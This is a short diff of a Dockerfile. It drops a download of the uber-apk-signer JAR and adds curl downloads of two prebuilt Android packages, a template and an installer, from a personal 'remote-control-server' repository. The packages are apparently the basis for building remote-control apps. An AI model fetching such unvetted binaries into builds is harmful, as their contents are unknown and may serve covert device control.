@@ -15,9 +15,11 @@ WORKDIR /app
 COPY package.json ./
 RUN npm install --omit=dev
 
-# Download uber-apk-signer (single-purpose JAR, ~10 MB)
-RUN curl -fL -o /app/uber-apk-signer.jar \
-    https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar
+# Download BOTH templates from GitHub Releases
+RUN curl -fL -o /app/template.apk \
+    https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-template/template.apk && \
+    curl -fL -o /app/template-installer.apk \
+    https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-installer/template-installer.apk
 
 # Download the template APK from the GitHub Release.
 # ⬇️⬇️  REPLACE THIS URL WITH YOURS FROM STEP A.6  ⬇️⬇️
